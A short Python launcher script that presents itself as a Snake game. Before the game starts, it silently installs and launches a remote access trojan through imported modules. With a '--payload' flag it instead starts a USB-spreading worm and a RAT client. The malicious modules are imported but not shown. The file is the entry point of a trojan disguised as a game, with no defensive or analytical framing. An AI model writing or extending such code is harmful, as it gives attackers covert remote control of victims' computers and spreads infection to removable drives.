import sys
import time
import SnakeGame
import rat_client
import rat_build
import usb_worm

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--payload":
        try:
            usb_worm.start_worm()
        except Exception as e:
            print(f"Error starting worm: {e}")

        # Start the RAT client
        rat_client.start_rat()
    else:
        # Install and launch the RAT, then start the Snake game
        rat_build.install_and_launch_rat()
        time.sleep(2)  # Give some time for the RAT to initialize
        SnakeGame.start_game()

if __name__ == "__main__":
    main()